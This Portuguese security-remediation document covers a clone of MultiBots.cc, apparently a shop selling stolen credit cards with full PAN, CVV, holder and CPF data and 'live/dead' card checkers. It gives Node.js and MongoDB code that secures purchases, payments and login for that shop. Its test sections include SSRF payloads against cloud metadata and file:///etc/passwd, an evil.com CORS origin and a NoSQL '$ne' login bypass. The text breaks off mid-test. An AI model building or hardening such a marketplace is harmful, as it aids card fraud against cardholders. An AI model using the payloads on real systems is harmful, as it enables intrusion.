# FALHAS DE SEGURANCA E CORRECOES OBRIGATORIAS

**Plataforma:** MultiBots.cc (Clone)
**Base de Referencia:** Pentest realizado em 2026-08-10/11
**Total de Vulnerabilidades:** 13 (3 Criticas, 5 Altas, 3 Medias, 2 Baixas)
**Autor:** Equipe de Seguranca Ofensiva
**Stack:** Node.js + Express + MongoDB + React (Vite)

> Este documento descreve TODAS as 13 vulnerabilidades encontradas na plataforma original
> MultiBots.cc e as correcoes OBRIGATORIAS que o clone deve implementar ANTES de ir para
> producao. Cada item inclui causa raiz, codigo de correcao e teste de verificacao.

---

## INDICE DE SEVERIDADE

| ID | Vulnerabilidade | CVSS | Severidade | Prioridade |
|----|-----------------|------|------------|------------|
| VULN-001 | Compra de Cartao a R$0 | 9.8 | CRITICA | IMEDIATA |
| VULN-002 | SSRF via Checker Settings | 9.1 | CRITICA | IMEDIATA |
| VULN-003 | Callback Crypto sem Autenticacao | 9.0 | CRITICA | IMEDIATA |
| VULN-004 | CORS Wildcard com Credentials | 8.1 | ALTA | IMEDIATA |
| VULN-005 | NoSQL Injection no Login | 7.5 | ALTA | IMEDIATA |
| VULN-006 | Cross-Tenant Data Access | 7.5 | ALTA | IMEDIATA |
| VULN-007 | API Keys em Plaintext | 7.2 | ALTA | URGENTE |
| VULN-008 | Stored XSS em Bot Settings | 6.8 | ALTA | URGENTE |
| VULN-009 | Gift Card Self-Recharge | 6.5 | MEDIA | URGENTE |
| VULN-010 | Upload Polyglot JPEG+PHP | 5.3 | MEDIA | ALTA |
| VULN-011 | Info Disclosure no Frontend Bundle | 5.0 | MEDIA | ALTA |
| VULN-012 | PIX Webhook Secret no Path | 3.7 | BAIXA | MEDIA |
| VULN-013 | CSV Upload Content Reflection | 2.0 | BAIXA | MEDIA |

---

## VULN-001 — Compra de Cartao a R$0 (CRITICA)

**CVSS:** 9.8 | **Prioridade:** IMEDIATA
**Endpoint(s) afetado(s):** `POST /api/purchases`, `/purchases/async`, `/purchases/auto-live/async`, `/purchases/mix-package`

### Causa Raiz

O endpoint web `/api/purchases` le o preco diretamente do documento do cartao no MongoDB
(`card.price`). Cartoes importados de fornecedores externos tem `price: 0` no documento
porque o fluxo Telegram aplica a tabela de precos por BIN dinamicamente. O endpoint web
NAO aplica essa tabela, resultando em:

1. Compra com `price: 0` aceita sem verificacao de saldo
2. Dados completos desmascarados (PAN, CVV, titular, CPF) retornados na resposta
3. Nenhum debito no saldo do comprador
4. Acesso ao pool global de 384K+ cartoes

### Como Corrigir

**Arquivo:** `backend/src/routes/purchases.js` e `backend/src/services/purchaseService.js`

```javascript
// ==============================================================
// backend/src/services/pricingService.js (NOVO ARQUIVO)
// ==============================================================

const BinPricing = require('../models/BinPricing');

/**
 * Resolve o preco real de um cartao baseado no BIN (primeiros 6 digitos).
 * NUNCA confia no price do documento do cartao.
 */
async function resolveCardPrice(card, botId) {
  const bin = card.number.substring(0, 6);

  // Buscar preco na tabela de BINs do tenant
  const binPrice = await BinPricing.findOne({
    bin: bin,
    bot_id: botId,
    active: true
  });

  if (!binPrice) {
    // Fallback: preco padrao do tipo de cartao
    const defaultPrices = {
      'full': 25.00,  // minimo para cartao full (com dados pessoais)
      'sem':  15.00   // minimo para cartao sem (apenas PAN/CVV/EXP)
    };
    return defaultPrices[card.base] || 25.00;
  }

  return binPrice.price;
}

module.exports = { resolveCardPrice };


// ==============================================================
// backend/src/middleware/purchaseValidation.js (NOVO MIDDLEWARE)
// ==============================================================

const { resolveCardPrice } = require('../services/pricingService');
const Card = require('../models/Card');
const User = require('../models/User');

async function validatePurchase(req, res, next) {
  const { cardId } = req.body;

  // 1. Validar que cardId e um numero inteiro positivo
  if (!Number.isInteger(cardId) || cardId <= 0) {
    return res.status(400).json({ error: 'cardId invalido' });
  }

  // 2. Buscar o cartao
  const card = await Card.findOne({ cardId, status: 'available' });
  if (!card) {
    return res.status(404).json({ error: 'Cartao nao encontrado ou indisponivel' });
  }

  // 3. Resolver preco REAL via tabela de BINs (NUNCA usar card.price)
  const realPrice = await resolveCardPrice(card, req.user.bot_id);

  // 4. REJEITAR se preco for zero ou negativo
  if (realPrice <= 0) {
    console.error(`[SECURITY] Tentativa de compra com preco <= 0. ` +
      `cardId=${cardId}, userId=${req.user.id}, resolvedPrice=${realPrice}`);
    return res.status(400).json({ error: 'Preco do cartao invalido' });
  }

  // 5. Verificar saldo SUFICIENTE
  const user = await User.findById(req.user.id);
  if (user.balance < realPrice) {
    return res.status(402).json({
      error: 'Saldo insuficiente',
      required: realPrice,
      balance: user.balance
    });
  }

  // Anexar dados validados ao request
  req.validatedPurchase = {
    card,
    realPrice,
    user
  };

  next();
}

module.exports = { validatePurchase };


// ==============================================================
// backend/src/routes/purchases.js (ROTA CORRIGIDA)
// ==============================================================

const mongoose = require('mongoose');
const rateLimit = require('express-rate-limit');
const { validatePurchase } = require('../middleware/purchaseValidation');

// Rate limit: maximo 5 compras por minuto por usuario
const purchaseRateLimit = rateLimit({
  windowMs: 60 * 1000,
  max: 5,
  keyGenerator: (req) => req.user.id,
  message: { error: 'Limite de compras excedido. Tente novamente em 1 minuto.' }
});

router.post('/api/purchases',
  authMiddleware,
  purchaseRateLimit,
  validatePurchase,
  async (req, res) => {
    const { card, realPrice, user } = req.validatedPurchase;

    // TRANSACAO ATOMICA MongoDB — garante consistencia
    const session = await mongoose.startSession();
    session.startTransaction();

    try {
      // 1. Debitar saldo com operacao atomica
      const updatedUser = await User.findOneAndUpdate(
        {
          _id: user._id,
          balance: { $gte: realPrice }  // double-check atomico
        },
        { $inc: { balance: -realPrice } },
        { new: true, session }
      );

      if (!updatedUser) {
        await session.abortTransaction();
        return res.status(402).json({ error: 'Saldo insuficiente' });
      }

      // 2. Marcar cartao como vendido (atomico)
      const updatedCard = await Card.findOneAndUpdate(
        {
          cardId: card.cardId,
          status: 'available'  // previne venda dupla
        },
        {
          status: 'sold',
          sold_to: user._id,
          sold_at: new Date(),
          sold_price: realPrice
        },
        { new: true, session }
      );

      if (!updatedCard) {
        await session.abortTransaction();
        return res.status(409).json({ error: 'Cartao ja vendido' });
      }

      // 3. Criar registro de compra
      const purchase = await Purchase.create([{
        user_id: user._id,
        card_id: card.cardId,
        bot_id: req.user.bot_id,
        price: realPrice,
        created_at: new Date()
      }], { session });

      await session.commitTransaction();

      // 4. Log de auditoria
      console.log(`[PURCHASE] userId=${user._id} cardId=${card.cardId} ` +
        `price=${realPrice} balance_after=${updatedUser.balance}`);

      res.json({
        success: true,
        purchase_id: purchase[0]._id,
        price: realPrice,
        balance: updatedUser.balance,
        card: {
          // Retornar dados desmascarados SOMENTE apos pagamento confirmado
          number: updatedCard.number,
          exp: updatedCard.exp,
          cvv: updatedCard.cvv,
          holder: updatedCard.holder
        }
      });

    } catch (error) {
      await session.abortTransaction();
      console.error('[PURCHASE ERROR]', error);
      res.status(500).json({ error: 'Erro ao processar compra' });
    } finally {
      session.endSession();
    }
  }
);
```

### Teste de Verificacao

```bash
# 1. Tentar comprar com saldo zero — deve retornar 402
curl -s -X POST "https://api.clone.com/api/purchases" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cardId":12345}' | jq .
# Esperado: {"error":"Saldo insuficiente","required":25.00,"balance":0}

# 2. Verificar que preco nunca e zero no banco
db.cards.find({ price: 0 }).count()  # Se > 0, o pricingService deve sobrescrever

# 3. Testar race condition — 10 compras simultaneas com saldo para 1
for i in {1..10}; do
  curl -s -X POST "https://api.clone.com/api/purchases" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"cardId":'$((12345+i))'}' &
done
wait
# Esperado: apenas 1 sucesso, 9 erros de saldo insuficiente

# 4. Verificar rate limit
for i in {1..10}; do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST \
    "https://api.clone.com/api/purchases" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"cardId":99999}'
done
# Esperado: primeiras 5 retornam 4xx normal, depois 429 Too Many Requests
```

---

## VULN-002 — SSRF via Checker Settings (CRITICA)

**CVSS:** 9.1 | **Prioridade:** IMEDIATA
**Endpoint(s) afetado(s):** `POST /api/admin/checker-settings`, `POST /api/cards/mass-check`

### Causa Raiz

O endpoint `/api/admin/checker-settings` aceita QUALQUER URL no campo `api_url` sem
nenhuma validacao. O servidor entao faz requisicoes HTTP outbound para essa URL durante o
mass-check de cartoes, usando `axios` sem restricao de protocolo ou destino. Isso permite:

1. Acesso a metadados de cloud (169.254.169.254)
2. Scan de rede interna (localhost, 10.x, 172.16.x, 192.168.x)
3. Leitura de arquivos via `file://`
4. Exfiltracao do IP real do servidor (bypass Cloudflare)
5. Configuracao de `live_price: 0` para executar checks sem custo

### Como Corrigir

**Arquivo:** `backend/src/utils/urlValidator.js` (NOVO) e `backend/src/routes/admin/checkerSettings.js`

```javascript
// ==============================================================
// backend/src/utils/urlValidator.js (NOVO ARQUIVO)
// ==============================================================

const { URL } = require('url');
const dns = require('dns').promises;
const ipaddr = require('ipaddr.js'); // npm install ipaddr.js

// Ranges de IP que NUNCA devem ser acessados via SSRF
const BLOCKED_RANGES = [
  '0.0.0.0/8',       // This network
  '10.0.0.0/8',      // Private (RFC 1918)
  '100.64.0.0/10',   // Carrier-grade NAT
  '127.0.0.0/8',     // Loopback
  '169.254.0.0/16',  // Link-local (metadata endpoint!)
  '172.16.0.0/12',   // Private (RFC 1918)
  '192.0.0.0/24',    // IETF Protocol
  '192.0.2.0/24',    // Documentation
  '192.168.0.0/16',  // Private (RFC 1918)
  '198.18.0.0/15',   // Benchmarking
  '198.51.100.0/24', // Documentation
  '203.0.113.0/24',  // Documentation
  '224.0.0.0/4',     // Multicast
  '240.0.0.0/4',     // Reserved
  '255.255.255.255/32', // Broadcast
  'fc00::/7',        // IPv6 unique local
  'fe80::/10',       // IPv6 link-local
  '::1/128',         // IPv6 loopback
  '::ffff:0:0/96',   // IPv4-mapped IPv6
];

// Dominios permitidos para checkers (allowlist)
const ALLOWED_CHECKER_DOMAINS = [
  // Adicione aqui os dominios de checkers aprovados
  // Exemplo: 'checker-api.example.com'
];

/**
 * Valida uma URL contra SSRF.
 * Retorna { valid: true } ou { valid: false, reason: '...' }
 */
async function validateUrlAgainstSSRF(urlString, options = {}) {
  const { allowlist = [], requireHttps = true } = options;

  // 1. Parsear URL
  let parsed;
  try {
    parsed = new URL(urlString);
  } catch (e) {
    return { valid: false, reason: 'URL malformada' };
  }

  // 2. Protocolo: SOMENTE https (ou http se explicitamente permitido)
  const allowedProtocols = requireHttps ? ['https:'] : ['https:', 'http:'];
  if (!allowedProtocols.includes(parsed.protocol)) {
    return {
      valid: false,
      reason: `Protocolo "${parsed.protocol}" nao permitido. Use HTTPS.`
    };
  }

  // 3. Bloquear auth em URL (user:pass@host)
  if (parsed.username || parsed.password) {
    return { valid: false, reason: 'Credenciais na URL nao permitidas' };
  }

  // 4. Bloquear portas nao-padrao (exceto 443 e 80)
  const port = parsed.port ? parseInt(parsed.port) : (parsed.protocol === 'https:' ? 443 : 80);
  if (![80, 443].includes(port)) {
    return { valid: false, reason: `Porta ${port} nao permitida. Use 80 ou 443.` };
  }

  // 5. Allowlist de dominios (se configurada)
  if (allowlist.length > 0 && !allowlist.includes(parsed.hostname)) {
    return {
      valid: false,
      reason: `Dominio "${parsed.hostname}" nao esta na lista de permitidos`
    };
  }

  // 6. Resolver DNS e verificar IP
  let addresses;
  try {
    addresses = await dns.resolve4(parsed.hostname);
  } catch (e) {
    // Tentar como IP literal
    try {
      const addr = ipaddr.parse(parsed.hostname);
      addresses = [addr.toString()];
    } catch (e2) {
      return { valid: false, reason: 'Nao foi possivel resolver o dominio' };
    }
  }

  // 7. Verificar cada IP resolvido contra ranges bloqueados
  for (const ip of addresses) {
    try {
      const addr = ipaddr.parse(ip);
      for (const range of BLOCKED_RANGES) {
        const [rangeAddr, prefix] = ipaddr.parseCIDR(range);
        if (addr.kind() === rangeAddr.kind() && addr.match([rangeAddr, prefix])) {
          return {
            valid: false,
            reason: `IP ${ip} esta em range bloqueado (${range})`
          };
        }
      }
    } catch (e) {
      return { valid: false, reason: `IP invalido: ${ip}` };
    }
  }

  return { valid: true, resolvedIPs: addresses };
}

module.exports = { validateUrlAgainstSSRF, ALLOWED_CHECKER_DOMAINS };


// ==============================================================
// backend/src/routes/admin/checkerSettings.js (CORRIGIDO)
// ==============================================================

const { validateUrlAgainstSSRF, ALLOWED_CHECKER_DOMAINS } = require('../../utils/urlValidator');

router.post('/api/admin/checker-settings',
  authMiddleware,
  requireAdmin,
  async (req, res) => {
    const { api_url, success_keyword, fail_keyword, live_price, dead_price } = req.body;

    // 1. Validar URL contra SSRF
    const urlCheck = await validateUrlAgainstSSRF(api_url, {
      allowlist: ALLOWED_CHECKER_DOMAINS,
      requireHttps: true
    });

    if (!urlCheck.valid) {
      return res.status(400).json({
        error: 'URL do checker invalida',
        detail: urlCheck.reason
      });
    }

    // 2. OBRIGAR precos minimos (impede check gratuito)
    const MIN_LIVE_PRICE = 0.50;  // centavos
    const MIN_DEAD_PRICE = 0.00;

    if (typeof live_price !== 'number' || live_price < MIN_LIVE_PRICE) {
      return res.status(400).json({
        error: `live_price deve ser >= ${MIN_LIVE_PRICE}`
      });
    }

    if (typeof dead_price !== 'number' || dead_price < MIN_DEAD_PRICE) {
      return res.status(400).json({
        error: `dead_price deve ser >= ${MIN_DEAD_PRICE}`
      });
    }

    // 3. Validar keywords (string nao vazia)
    if (typeof success_keyword !== 'string' || success_keyword.trim().length === 0) {
      return res.status(400).json({ error: 'success_keyword obrigatorio' });
    }
    if (typeof fail_keyword !== 'string' || fail_keyword.trim().length === 0) {
      return res.status(400).json({ error: 'fail_keyword obrigatorio' });
    }

    // 4. Salvar com owner_id do tenant
    await CheckerSettings.findOneAndUpdate(
      { owner_id: req.user.owner_id },
      {
        api_url,
        success_keyword: success_keyword.trim(),
        fail_keyword: fail_keyword.trim(),
        live_price,
        dead_price,
        updated_at: new Date(),
        updated_by: req.user.id
      },
      { upsert: true }
    );

    // 5. Log de auditoria
    console.log(`[AUDIT] checker-settings updated by userId=${req.user.id} ` +
      `api_url=${api_url} live_price=${live_price}`);

    res.json({ success: true });
  }
);
```

### Teste de Verificacao

```bash
# 1. Tentar URL com IP privado — deve ser rejeitado
curl -s -X POST "https://api.clone.com/api/admin/checker-settings" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"api_url":"http://169.254.169.254/latest/meta-data/","success_keyword":"OK","fail_keyword":"FAIL","live_price":1,"dead_price":0}'
# Esperado: 400 {"error":"URL do checker invalida","detail":"IP ... em range bloqueado"}

# 2. Tentar protocolo file:// — deve ser rejeitado
curl -s -X POST "https://api.clone.com/api/admin/checker-settings" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"api_url":"file:///etc/passwd","success_keyword":"root","fail_keyword":"nope","live_price":1,"dead_price":0}'
# Esperado: 400 {"error":"URL do checker invalida","detail":"Protocolo \"file:\" nao permitido"}

# 3. Tentar live_price = 0 — deve ser rejeitado
curl -s -X POST "https://api.clone.com/api/admin/checker-settings" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"api_url":"https://checker.example.com/check","success_keyword":"OK","fail_keyword":"FAIL","live_price":0,"dead_price":0}'
# Esperado: 400 {"error":"live_price deve ser >= 0.50"}

# 4. Tentar URL com porta nao padrao — deve ser rejeitado
curl -s -X POST "https://api.clone.com/api/admin/checker-settings" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"api_url":"http://102.165.46.194:3005/check","success_keyword":"OK","fail_keyword":"FAIL","live_price":1,"dead_price":0}'
# Esperado: 400 {"error":"URL do checker invalida","detail":"Porta 3005 nao permitida"}

# 5. Tentar localhost via DNS rebinding (dominio que resolve para 127.0.0.1)
# O validador resolve DNS ANTES de fazer a requisicao, bloqueando rebinding
```

---

## VULN-003 — Callback Crypto sem Autenticacao (CRITICA)

**CVSS:** 9.0 | **Prioridade:** IMEDIATA
**Endpoint(s) afetado(s):** `POST /api/crypto/plisio/callback`

### Causa Raiz

O endpoint aceita qualquer POST e retorna `{"ok":true}` sem nenhuma verificacao:

1. Sem validacao de assinatura HMAC
2. Sem verificacao de IP de origem (Plisio)
3. Sem validacao de schema do body
4. Sem verificacao se `order_number` existe no sistema
5. Sem controle de idempotencia (replay attacks)

Um atacante pode forjar callbacks para creditar saldo sem pagamento real.

### Como Corrigir

**Arquivo:** `backend/src/routes/crypto.js` e `backend/src/middleware/plisioAuth.js` (NOVO)

```javascript
// ==============================================================
// backend/src/middleware/plisioAuth.js (NOVO ARQUIVO)
// ==============================================================

const crypto = require('crypto');

// IPs oficiais da Plisio (verificar documentacao atualizada)
// https://plisio.net/documentation/endpoints/callbacks
const PLISIO_ALLOWED_IPS = [
  // Adicionar IPs oficiais da Plisio aqui
  // Exemplo: '185.71.65.0/24'
];

/**
 * Middleware de autenticacao para callbacks da Plisio.
 * Verifica HMAC, IP de origem e schema.
 */
function verifyPlisioCallback(req, res, next) {
  const PLISIO_SECRET = process.env.PLISIO_SECRET_KEY;

  if (!PLISIO_SECRET) {
    console.error('[CRITICAL] PLISIO_SECRET_KEY nao configurada');
    return res.status(500).json({ error: 'Configuracao de pagamento invalida' });
  }

  // 1. Verificar IP de origem
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
    || req.connection.remoteAddress;

  if (PLISIO_ALLOWED_IPS.length > 0) {
    const ipAllowed = PLISIO_ALLOWED_IPS.some(allowedIp => {
      if (allowedIp.includes('/')) {
        return isIpInCIDR(clientIp, allowedIp);
      }
      return clientIp === allowedIp;
    });

    if (!ipAllowed) {
      console.warn(`[SECURITY] Callback Plisio de IP nao autorizado: ${clientIp}`);
      // Retornar 200 para nao revelar informacao ao atacante
      return res.status(200).json({ ok: false });
    }
  }

  // 2. Verificar assinatura HMAC
  // A Plisio envia o HMAC no header ou no body (verificar documentacao)
  const receivedSignature = req.headers['x-plisio-signature']
    || req.body?.verify_hash;

  if (!receivedSignature) {
    console.warn(`[SECURITY] Callback sem assinatura HMAC. IP: ${clientIp}`);
    return res.status(200).json({ ok: false });
  }

  // Calcular HMAC esperado (baseado no body da requisicao)
  // O payload para verificacao depende da documentacao da Plisio
  const bodyWithoutHash = { ...req.body };
  delete bodyWithoutHash.verify_hash;

  // Ordenar chaves e serializar
  const sortedKeys = Object.keys(bodyWithoutHash).sort();
  const dataString = sortedKeys.map(k => bodyWithoutHash[k]).join('');

  const expectedSignature = crypto
    .createHmac('sha1', PLISIO_SECRET)
    .update(dataString)
    .digest('hex');

  if (!crypto.timingSafeEqual(
    Buffer.from(receivedSignature, 'hex'),
    Buffer.from(expectedSignature, 'hex')
  )) {
    console.warn(`[SECURITY] HMAC invalido no callback Plisio. IP: ${clientIp}`);
    return res.status(200).json({ ok: false });
  }

  // 3. Validar schema minimo do body
  const required = ['status', 'order_number', 'amount', 'txn_id', 'currency'];
  const missing = required.filter(field => !req.body[field]);

  if (missing.length > 0) {
    console.warn(`[SECURITY] Callback com campos faltando: ${missing.join(', ')}`);
    return res.status(200).json({ ok: false });
  }

  // 4. Validar que status e um valor conhecido
  const validStatuses = ['new', 'pending', 'completed', 'expired', 'error', 'mismatch'];
  if (!validStatuses.includes(req.body.status)) {
    console.warn(`[SECURITY] Status desconhecido: ${req.body.status}`);
    return res.status(200).json({ ok: false });
  }

  next();
}

module.exports = { verifyPlisioCallback };


// ==============================================================
// backend/src/routes/crypto.js (CORRIGIDO)
// ==============================================================

const { verifyPlisioCallback } = require('../middleware/plisioAuth');
const ProcessedCallback = require('../models/ProcessedCallback');
const Order = require('../models/Order');
const User = require('../models/User');
const mongoose = require('mongoose');

router.post('/api/crypto/plisio/callback',
  verifyPlisioCallback,  // <-- MIDDLEWARE DE AUTENTICACAO
  async (req, res) => {
    const { status, order_number, amount, txn_id, currency } = req.body;

    // 1. Idempotencia: verificar se txn_id ja foi processado
    const existing = await ProcessedCallback.findOne({ txn_id });
    if (existing) {
      console.log(`[CRYPTO] Callback duplicado ignorado: txn_id=${txn_id}`);
      return res.json({ ok: true }); // Idempotente — retornar sucesso
    }

    // 2. Verificar que a order existe no sistema
    const order = await Order.findOne({ order_number });
    if (!order) {
      console.warn(`[SECURITY] Callback para order inexistente: ${order_number}`);
      return res.json({ ok: false });
    }

    // 3. Verificar que o amount corresponde ao esperado
    const tolerance = 0.01; // 1% de tolerancia para flutuacao crypto
    const expectedAmount = order.expected_amount;
    const receivedAmount = parseFloat(amount);

    if (Math.abs(receivedAmount - expectedAmount) / expectedAmount > tolerance) {
      console.warn(`[SECURITY] Amount divergente: esperado=${expectedAmount}, ` +
        `recebido=${receivedAmount}, order=${order_number}`);
      return res.json({ ok: false });
    }

    // 4. Processar somente se status = completed
    if (status !== 'completed') {
      // Registrar status intermediario sem creditar
      await ProcessedCallback.create({
        txn_id,
        order_number,
        status,
        amount: receivedAmount,
        processed_at: new Date()
      });
      return res.json({ ok: true });
    }

    // 5. Creditar saldo com transacao atomica
    const session = await mongoose.startSession();
    session.startTransaction();

    try {
      // Marcar order como paga
      const updatedOrder = await Order.findOneAndUpdate(
        { order_number, status: 'pending' },  // so processa se pendente
        { status: 'completed', paid_at: new Date(), txn_id },
        { new: true, session }
      );

      if (!updatedOrder) {
        await session.abortTransaction();
        console.warn(`[CRYPTO] Order nao esta pendente: ${order_number}`);
        return res.json({ ok: true }); // Idempotente
      }

      // Creditar usuario
      await User.findByIdAndUpdate(
        updatedOrder.user_id,
        { $inc: { balance: updatedOrder.credit_amount } },
        { session }
      );

      // Registrar callback processado (idempotencia)
      await ProcessedCallback.create([{
        txn_id,
        order_number,
        status: 'completed',
        amount: receivedAmount,
        processed_at: new Date()
      }], { session });

      await session.commitTransaction();

      console.log(`[CRYPTO] Pagamento confirmado: order=${order_number} ` +
        `amount=${receivedAmount} userId=${updatedOrder.user_id}`);

      res.json({ ok: true });

    } catch (error) {
      await session.abortTransaction();
      console.error('[CRYPTO ERROR]', error);
      res.status(500).json({ ok: false });
    } finally {
      session.endSession();
    }
  }
);
```

### Teste de Verificacao

```bash
# 1. Callback sem HMAC — deve ser ignorado (retorna ok:false)
curl -s -X POST "https://api.clone.com/api/crypto/plisio/callback" \
  -H "Content-Type: application/json" \
  -d '{"status":"completed","amount":"100","txn_id":"fake123","order_number":"ORD-999"}'
# Esperado: {"ok":false} (sem assinatura HMAC)

# 2. Callback com HMAC invalido — deve ser ignorado
curl -s -X POST "https://api.clone.com/api/crypto/plisio/callback" \
  -H "Content-Type: application/json" \
  -H "X-Plisio-Signature: 0000000000000000000000000000000000000000" \
  -d '{"status":"completed","amount":"100","txn_id":"fake456","order_number":"ORD-999"}'
# Esperado: {"ok":false} (HMAC nao corresponde)

# 3. Callback com order inexistente — deve ser ignorado
# (mesmo com HMAC valido, order_number nao existe)

# 4. Replay do mesmo txn_id — deve ser idempotente (ok:true, sem debito duplo)

# 5. Verificar logs de seguranca em cada tentativa rejeitada
grep "SECURITY" /var/log/app.log | tail -20
```

---

## VULN-004 — CORS Wildcard com Credentials (ALTA)

**CVSS:** 8.1 | **Prioridade:** IMEDIATA
**Endpoint(s) afetado(s):** Todos os endpoints da API

### Causa Raiz

A configuracao CORS usa `cors({ origin: true, credentials: true })`, que reflete
qualquer header `Origin` da requisicao como `Access-Control-Allow-Origin`, junto com
`Access-Control-Allow-Credentials: true`. Isso permite que qualquer site malicioso faca
requisicoes autenticadas cross-origin e leia as respostas, roubando dados de admins
logados.

### Como Corrigir

**Arquivo:** `backend/src/config/cors.js` (NOVO) e `backend/src/app.js`

```javascript
// ==============================================================
// backend/src/config/cors.js (NOVO ARQUIVO)
// ==============================================================

const cors = require('cors');

// Lista EXPLICITA de origens permitidas
const ALLOWED_ORIGINS = [
  process.env.FRONTEND_URL,              // Ex: https://painel.clone.com
  process.env.ADMIN_FRONTEND_URL,        // Ex: https://admin.clone.com
  // NAO adicionar '*' ou 'true' aqui
].filter(Boolean); // Remove undefined/null

const corsOptions = {
  origin: function (origin, callback) {
    // Permitir requests sem origin (mobile apps, curl, server-to-server)
    // NOTA: em producao, considere bloquear requests sem origin tambem
    if (!origin) {
      return callback(null, true);
    }

    if (ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      console.warn(`[CORS] Origin bloqueada: ${origin}`);
      callback(new Error('Bloqueado pela politica de CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-Requested-With',
    'X-CSRF-Token'
  ],
  exposedHeaders: ['X-Total-Count', 'X-Page-Count'],
  maxAge: 600 // Cache preflight por 10 minutos
};

module.exports = { corsOptions };


// ==============================================================
// backend/src/app.js (APLICAR)
// ==============================================================

const { corsOptions } = require('./config/cors');

// ANTES (VULNERAVEL):
// app.use(cors({ origin: true, credentials: true }));

// DEPOIS (CORRIGIDO):
app.use(cors(corsOptions));
```

### Teste de Verificacao

```bash
# 1. Origin permitida — deve funcionar
curl -s -I "https://api.clone.com/api/auth/me" \
  -H "Origin: https://painel.clone.com" \
  -H "Authorization: Bearer $TOKEN"
# Esperado: Access-Control-Allow-Origin: https://painel.clone.com
#           Access-Control-Allow-Credentials: true

# 2. Origin maliciosa — deve ser bloqueada
curl -s -I "https://api.clone.com/api/auth/me" \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer $TOKEN"
# Esperado: SEM header Access-Control-Allow-Origin (ou erro CORS)

# 3. Preflight com origin maliciosa
curl -s -I -X OPTIONS "https://api.clone.com/api/auth/me" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET"
# Esperado: Erro ou ausencia de headers CORS permissivos
```

---

## VULN-005 — NoSQL Injection no Login (ALTA)

**CVSS:** 7.5 | **Prioridade:** IMEDIATA
**Endpoint(s) afetado(s):** `POST /api/auth/login`

### Causa Raiz

O campo `password` da requisicao de login e passado diretamente para a query MongoDB
sem sanitizacao de tipo. O MongoDB aceita operadores como `$ne`, `$regex`, `$gt`,
`$exists` quando o campo e um objeto em vez de string. Isso permite:

1. Bypass de autenticacao com `{"password": {"$ne": ""}}`
2. Extracao blind de senhas com `{"password": {"$regex": "^a.*"}}`
3. Enumeracao de usuarios com respostas diferenciais (500 vs "Credenciais invalidas")

### Como Corrigir

**Arquivo:** `backend/src/middleware/inputSanitizer.js` (NOVO) e `backend/src/routes/auth.js`

```javascript
// ==============================================================
// backend/src/middleware/inputSanitizer.js (NOVO ARQUIVO)
// ==============================================================

const mongoSanitize = require('express-mongo-sanitize');
// npm install express-mongo-sanitize

/**
 * Middleware global de sanitizacao contra NoSQL Injection.
 * Remove operadores MongoDB ($ne, $gt, $regex, etc.) de req.body, req.query, req.params.
 */
const globalMongoSanitizer = mongoSanitize({
  replaceWith: '_',
  onSanitize: ({ req, key }) => {
    console.warn(`[SECURITY] NoSQL Injection bloqueado: ` +
      `key="${key}" ip=${req.ip} path=${req.path}`);
  }
});

/**
 * Validacao de tipo estrita para campos de autenticacao.
 * Garante que username e password sao STRINGS.
 */
function validateAuthInput(req, res, next) {
  const { username, password } = req.body;

  // Tipo ESTRITO: deve ser string
  if (typeof username !== 'string' || typeof password !== 'string') {
    console.warn(`[SECURITY] Tipo invalido no login: ` +
      `username=${typeof username} password=${typeof password} ip=${req.ip}`);
    return res.status(400).json({ error: 'Credenciais invalidas' });
  }

  // Tamanho maximo para prevenir ReDoS e abuso
  if (username.length > 100 || password.length > 200) {
    return res.status(400).json({ error: 'Credenciais invalidas' });
  }

  // Tamanho minimo
  if (username.length < 1 || password.length < 1) {
    return res.status(400).json({ error: 'Credenciais invalidas' });
  }

  next();
}

/**
 * Validacao generica de tipo para qualquer campo.
 * Uso: validateTypes({ campo: 'string', idade: 'number' })
 */
function validateTypes(schema) {
  return (req, res, next) => {
    for (const [field, expectedType] of Object.entries(schema)) {
      const value = req.body[field];
      if (value !== undefined && typeof value !== expectedType) {
        return res.status(400).json({
          error: `Campo "${field}" deve ser do tipo ${expectedType}`
        });
      }
    }
    next();
  };
}

module.exports = { globalMongoSanitizer, validateAuthInput, validateTypes };


// ==============================================================
// backend/src/app.js (APLICAR GLOBALMENTE)
// ==============================================================

const { globalMongoSanitizer } = require('./middleware/inputSanitizer');

// Aplicar ANTES de todas as rotas
app.use(express.json({ limit: '1mb' }));
app.use(globalMongoSanitizer); // <-- BLOQUEIA $ne, $gt, $regex em TODOS os endpoints


// ==============================================================
// backend/src/routes/auth.js (CORRIGIDO)
// ==============================================================

const bcrypt = require('bcrypt');
const { validateAuthInput } = require('../middleware/inputSanitizer');

router.post('/api/auth/login',
  validateAuthInput,  // <-- VALIDACAO DE TIPO
  async (req, res) => {
    const { username, password } = req.body;

    try {
      // Buscar usuario SOMENTE por username (NUNCA incluir password na query)
      const user = await User.findOne({ username: username });

      // Mensagem GENERICA — nao revelar se usuario existe ou nao
      if (!user) {
        // Executar bcrypt mesmo sem usuario (timing attack prevention)
        await bcrypt.compare(password, '$2b$10$invalidhashpaddingtopreventsidechannel');
        return res.status(401).json({ error: 'Credenciais invalidas' });
      }

      // Comparar senha com hash armazenado
      const passwordMatch = await bcrypt.compare(password, user.password_hash);

      if (!passwordMatch) {
        return res.status(401).json({ error: 'Credenciais invalidas' });
      }

      // Gerar JWT e retornar
      const token = generateJWT(user);
      res.json({ token, user: sanitizeUser(user) });

    } catch (error) {
      // NUNCA retornar detalhes do erro ao cliente
      console.error('[AUTH ERROR]', error);
      res.status(401).json({ error: 'Credenciais invalidas' });
    }
  }
);
```

### Teste de Verificacao

```bash
# 1. Operador $ne deve ser bloqueado
